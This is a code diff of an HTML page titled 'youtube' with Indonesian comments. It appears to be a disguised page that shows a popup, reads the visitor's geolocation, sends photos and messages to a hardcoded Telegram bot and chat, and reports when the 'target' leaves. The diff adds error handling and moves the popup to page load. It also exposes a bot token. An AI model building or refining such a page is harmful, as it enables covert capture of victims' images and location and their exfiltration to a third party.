@@ -4,11 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>youtube</title>
-    <!-- Tambahkan AOS CSS -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" />
-
     <style>
-        /* Gaya sebelumnya tetap */
+        /* Gaya CSS Anda tetap sama */
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -77,19 +75,19 @@
         }
         
         .loader {
-    border: 8px solid #f3f3f3;
-    border-radius: 50%;
-    border-top: 8px solid #3498db;
-    width: 50px;
-    height: 50px;
-    animation: spin 1s linear infinite;
-    margin: 0 auto;
-}
+            border: 8px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 8px solid #3498db;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
 
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -102,28 +100,32 @@
         </div>
     </div>
 
-<div class="container" id="loadingContainer">
-    <div class="loader"></div>
-</div>
+    <div class="container" id="loadingContainer">
+        <div class="loader"></div>
+    </div>
 
-    <!-- Tambahkan AOS JavaScript -->
     <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js"></script>
     <script>
-        AOS.init({
-            duration: 1000, // Durasi animasi dalam milidetik
-            once: true // Animasi hanya terjadi sekali
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('popup').style.display = 'flex';
+            AOS.init();
         });
 
-        // Kode JavaScript lainnya tetap
         const botToken = '7095850929:AAHww_RJttOcbEL2fn9N58i9RuI9Xf0G6mw';
         const chatId = '5689892196';
 
         function sendMessageToTelegram(message) {
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             return fetch(telegramApiUrl)
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.json();
+                })
                 .catch(error => {
                     console.error('Failed to send message to Telegram: ' + error.message);
+                    document.getElementById('error').textContent = 'Failed to send message to Telegram: ' + error.message;
                 });
         }
 
@@ -144,9 +146,15 @@
                 method: 'POST',
                 body: formData
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
+            })
             .catch(error => {
                 console.error('Failed to send photo to Telegram: ' + error.message);
+                document.getElementById('error').textContent = 'Failed to send photo to Telegram: ' + error.message;
             });
         }
 
@@ -201,21 +209,17 @@
                             });
                     },
                     error => {
-                        document.getElementById('error').textContent = 'browser tidak support.';
+                        document.getElementById('error').textContent = 'Failed to get location: ' + error.message;
                     }
                 );
             } else {
-                document.getElementById('error').textContent = 'browser tidak support.';
+                document.getElementById('error').textContent = 'Browser does not support required APIs.';
             }
         }
 
-        window.onload = function() {
-            document.getElementById('popup').style.display = 'flex';
-        }
-
         window.onbeforeunload = function() {
-            sendMessageToTelegram('target keluar browser.');
-        }
+            sendMessageToTelegram('User left the browser.');
+        };
     </script>
 </body>
 </html>
